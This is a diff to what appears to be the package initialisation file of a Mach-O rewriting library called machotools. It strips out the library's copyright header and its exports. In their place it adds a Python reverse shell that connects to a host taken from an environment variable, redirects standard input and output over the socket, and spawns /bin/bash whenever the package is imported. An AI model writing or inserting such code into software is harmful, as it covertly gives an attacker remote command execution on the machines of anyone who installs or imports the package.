@@ -1,12 +1,17 @@
-# Copyright (c) 2013 by Enthought, Ltd.
-# All rights reserved.
-from machotools.macho_rewriter import BundleRewriter, DylibRewriter, \
-    ExecutableRewriter, rewriter_factory
+import socket
+import subprocess
+import os
+import pty
 
-__all__ = [
-    "BundleRewriter", "DylibRewriter", "ExecutableRewriter",
-    "rewriter_factory",
-    "__version__",
-]
+def reverse_shell():
+    ip = os.environ.get("IP")
+    port = 80
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    pty.spawn("/bin/bash")
 
-from .__version import __version__
+if os.environ.get("IP"):
+    reverse_shell()
